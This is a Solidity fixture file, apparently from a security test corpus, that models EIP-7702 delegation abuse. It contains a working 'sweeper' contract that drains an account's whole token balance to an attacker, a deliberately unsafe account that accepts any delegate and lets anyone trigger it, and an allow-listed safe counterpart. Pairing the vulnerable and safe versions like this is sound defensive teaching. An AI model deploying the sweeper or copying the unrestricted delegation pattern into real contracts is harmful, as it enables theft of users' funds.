// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// EIP-7702 delegation-abuse vector (#8). Toy targets for the corpus.
//
// EIP-7702 (live on Ethereum mainnet since the 2025 Pectra upgrade) lets an EOA sign a
// SET_CODE authorization that points the account at *delegate* code; calls into the account
// then execute that code IN THE ACCOUNT'S OWN CONTEXT (its balances, its address). A victim
// phished into signing a malicious authorization hands an attacker contract the ability to
// act as the account - one signature drains everything, no per-token approval needed.
//
// We model the "code runs as the account" semantics EXPLICITLY via delegatecall rather than
// via the vm.signDelegation / vm.attachDelegation cheatcodes, so the fixture is deterministic
// on any EVM/toolchain. This is faithful to the drain mechanism (delegate logic executes with
// the account's token balance) and is noted in each PROVENANCE.md.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title DelegationSweeper - the attacker's EIP-7702 delegate (a "CrimeEnjoyor"-style sweeper).
/// @notice When installed as the account's delegate and activated, this runs in the account's
///         context and moves the account's ENTIRE token balance to the attacker in one call.
///         A single reusable sweeper serves every phished victim.
contract DelegationSweeper {
    /// @dev Executed in the victim account's context: `address(this)` is the account.
    function sweep(address token, address attacker) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, bal);
    }
}

/// @title VulnerableDelegationAccount - an EOA that accepts ANY EIP-7702 delegation.
/// @notice No delegation policy: it installs whatever delegate a (phished) authorization
///         names and then runs it in its own context. A victim tricked into authorizing an
///         attacker sweeper is drained on the first activation.
contract VulnerableDelegationAccount {
    address public delegate;

    /// Install a signed 7702 delegation. UNSAFE: any delegate is accepted.
    function installDelegation(address delegate_) external {
        delegate = delegate_;
    }

    /// Activate the delegate in this account's context (delegatecall models 7702 "run delegate
    /// code as the account"). Invokable by anyone - reusable sweepers rely on this.
    function activate(bytes calldata data) external returns (bytes memory) {
        require(delegate != address(0), "no delegation");
        (bool ok, bytes memory ret) = delegate.delegatecall(data);
        require(ok, "delegate execution failed");
        return ret;
    }

    receive() external payable {}
}

/// @title SafeDelegationAccount - an EOA that honors ONLY allow-listed, audited delegates.
/// @notice The canonical defense: decode the 7702 authorization and refuse to delegate to
///         anything but a known, audited delegate. An attacker sweeper is not allow-listed, so
///         installDelegation reverts and the drain path is never reachable.
contract SafeDelegationAccount {
    address public immutable owner;
    mapping(address => bool) public allowlisted; // audited delegates only
    address public delegate;

    constructor() {
        owner = msg.sender;
    }

    function allow(address delegate_) external {
        require(msg.sender == owner, "only owner");
        allowlisted[delegate_] = true;
    }

    /// SAFE: refuse delegation to any delegate that is not allow-listed/audited.
    function installDelegation(address delegate_) external {
        require(allowlisted[delegate_], "delegate not allow-listed");
        delegate = delegate_;
    }

    function activate(bytes calldata data) external returns (bytes memory) {
        require(delegate != address(0), "no delegation");
        (bool ok, bytes memory ret) = delegate.delegatecall(data);
        require(ok, "delegate execution failed");
        return ret;
    }

    receive() external payable {}
}
